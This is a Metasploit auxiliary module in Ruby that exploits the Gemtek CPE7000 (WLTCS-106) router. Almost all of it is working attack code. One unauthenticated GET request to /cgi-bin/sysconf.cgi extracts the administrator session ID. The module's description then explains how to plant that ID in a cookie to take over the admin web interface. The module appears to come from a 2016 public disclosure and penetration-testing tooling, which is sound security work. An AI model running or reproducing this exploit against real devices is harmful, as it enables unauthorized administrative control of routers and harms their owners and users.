# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Gemtek CPE7000 - WLTCS-106 Administrator SID Retriever&#039;,
      &#039;Description&#039;    => %q{
          A vulnerability exists for Gemtek CPE7000 model ID WLTCS-106 which allows
        unauthenticated remote attackers to retrieve a valid Administrative SID.
 
        To obtain an administrative web session inject this SID in your client&#039;s
        cookie with values as follow: userlevel=2;sid=<SID>
 
        Tested on Hardware version V02A and Firmware version 01.01.02.082.
      },
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;39716&#039; ],
          [ &#039;URL&#039;, &#039;http://www.mentat.is/docs/cpe7000-multiple-vulns.html&#039; ],
          [ &#039;URL&#039; , &#039;http://www.gemtek.com.tw/&#039; ]
        ],
      &#039;Author&#039;         =>
        [
          &#039;Federico Scalco <fscalco [ at] mentat.is>&#039;
          #Based on the exploit by Federico Ramondino <framondino [at ] mentat.is>
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => "Apr 07 2016",
      &#039;DefaultOptions&#039; =>
      {
        &#039;RPORT&#039; => 443
      }
    ))
 
    register_options(
      [
        OptString.new("TARGETURI", [true, &#039;The base URI to target application&#039;, &#039;/&#039;]),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true])
      ], self.class)
  end
 
  def run
    @peer = "#{rhost}:#{rport}"
 
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/cgi-bin/sysconf.cgi&#039;,
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;ajax.asp&#039;,
        &#039;action&#039; => &#039;login_confirm&#039;
      }
    })
 
    if !res or res.code != 200
      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way")
    end
 
    ssid = res.body.split(&#039;,&#039;, 2)
    print_good("#{@peer} - Valid root SID retrieved: #{ssid[1]}")
  end
end

